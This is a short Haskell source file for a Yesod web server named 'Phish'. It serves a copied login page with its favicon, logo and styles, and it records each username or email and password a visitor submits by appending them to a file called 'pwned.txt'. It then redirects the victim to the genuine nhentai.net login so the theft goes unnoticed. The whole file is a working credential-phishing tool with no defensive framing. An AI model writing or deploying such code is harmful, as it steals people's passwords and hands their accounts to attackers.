module Main where

import Yesod
import qualified Data.Text as T
import qualified Data.Text.IO as IOT

data Phish = Phish

mkYesod "Phish" [parseRoutes|
  /login       HomeR    GET POST
  /favicon.ico FavR     GET
  /style       StyleR   GET
  /logo        LogoR GET
  |]

instance Yesod Phish

maybeToString s 
  = case s of
      Just text -> text
      Nothing -> ""

getFavR :: Handler ()
getFavR = sendFile "image/x-icon" "index_files/favicon.ico"

getLogoR :: Handler ()
getLogoR = sendFile "image/svg+xml" "index_files/logo.svg"

getStyleR :: Handler ()
getStyleR = sendFile "text/css" "index_files/styles.css"

getHomeR :: Handler ()
getHomeR = sendFile "text/html" "index.html"

postHomeR :: Handler ()
postHomeR = do
  username <- lookupPostParam "username_or_email"
  pass <- lookupPostParam "password"
  let 
    msg  = T.concat 
      [ maybeToString username, ":", maybeToString pass,"\n"]
  liftIO $ IOT.appendFile "pwned.txt" msg
  sauce <- lookupGetParam "next"
  case sauce of
    Just num -> redirect $! T.concat ["https://nhentai.net/login/?next=",num]
    Nothing -> redirect ("https://nhentai.net/login/?next=/" :: T.Text)


main = warp 3000 Phish
